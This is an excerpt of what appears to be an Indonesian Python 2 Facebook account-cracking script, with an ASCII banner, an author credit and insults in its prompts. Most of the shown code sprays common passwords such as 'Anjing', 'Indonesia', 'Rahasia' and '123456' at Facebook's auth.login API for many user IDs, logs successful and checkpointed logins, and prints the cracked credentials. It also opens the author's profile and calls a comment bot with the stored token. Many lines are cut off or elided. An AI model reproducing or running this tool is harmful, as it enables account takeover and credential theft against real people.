...
\33[37;1m██████╔╝██║███████╗███████╗░░░░░░██║░░██║
\33[37;1m╚═════╝░╚═╝╚══════╝╚══════╝░░░░░░╚═╝░░╚═╝
\033[1;41;97m Rizky Ferdiansyah \033[0m
 """
def tik():
        titik = ['.   ','..  ','... ']
        for o in titik:
...
def tokenz():
        ...
        try:
                ...
                zedd.write(toket)
                zedd.close()
                jalan ('\033[1;97m JANGAN LUPA FOLLOW AKUN GW')
                print '\033[1;97m[\033[1;39m✓\033[1;97m]\033[1;39m Alhamdulillah'
                os.system('xdg-open  https://www.facebook.com/S.D.F.A.D.77778')
                bot_komen()
        except KeyError:
...
def pilih_indo():
        ...
        if teak =="":
                print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar Goblok!"
                pilih_indo()
        ...
        print "\n\033[1;97m ══════════════════════════════════════════"
        print "\033[1;97m \033[1;41;97m TO STOP PROCESS,PRESS CTRL+Z.GOOD LUCK ^_^ \033[0m"
        print "\033[1;97m ══════════════════════════════════════════
        ##### MAIN INDONESIA #####
        def main(arg):
                ...
                try:
                        ...
                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_>
                        w = json.load(data)
                                ...
                                if 'www.facebook.com' in w['error_msg']:
                                        ...
                                        if 'access_token' in w:
                                                ...
                                                if 'www.facebook.com' in w['error_msg']:
                                                        ...
                                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac2>
                                                        w = json.load(data)
                                                        if 'access_token' in w:
                                                                                ...
                                                                                if 'www.facebook.com' in w['error_msg']:
                                                                                       ...
                                                                                       if 'access_token' in w:
                                                                                                ...
                                                                                                if 'www.facebook.com' in w['error_msg']:
                                                                                                        ...
                                                                                                        pass6 = 'Anjing'
                                                                                                        data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?acce>
                                                                                                        w = json.load(data)
                                                                                                        if 'access_token' in w:
                                                                                                                ...
                                                                                                                if 'www.facebook.com' in w['error_msg']:
                                                                                                                        print '\033[1;93m | ' + user + ' • ' + pass6 + ' • ' + c>
                                                                                                                        cekpoint.append(user)
                                                                                                                else:
                                                                                                                        pass7 = 'Indonesia'
                                                                                                                        data = urllib.urlopen("https://b-api.facebook.com/method>
                                                                                                                        w = json.load(data)
                                                                                                                        if 'access_token' in w:
                                                                                                                                print '\033[1;92m | ' + user + ' • ' + pass7 + '>
                                                                                                                                oks.append(user)
                                                                                                                        else:
                                                                                                                                if 'www.facebook.com' in w['error_msg']:
                                                                                                                                        print '\033[1;93m | ' + user + ' • ' + p>
                                                                                                                                        cekpoint.append(user)
                                                                                                                                else:
                                                                                                                                        pass8 = 'Rahasia'
                                                                                                                                        data = urllib.urlopen("https://b-api.fac>
                                                                                                                                        w = json.load(data)
                                                                                                                                        if 'access_token' in w:
                                                                                                                                                print '\033[1;92m | ' + user + '>
                                                                                                                                                oks.append(user)
                                                                                                                                        else:
                                                                                                                                                if 'www.facebook.com' in w['erro>
                                                                                                                                                        print '\033[1;93m | ' + >
                                                                                                                                                        cekpoint.append(user)
                                                                                                                                                else:
                                                                                                                                                        pass9 = '123456'
        ...
        print"\033[1;97m[\033[1;91m•\033[1;93m•\033[1;92m•\033[1;97m] \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033>
...
def crack_likes():
        ...
        print"\033[1;97m[\033[1;93m•\033[1;97m] \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoi>
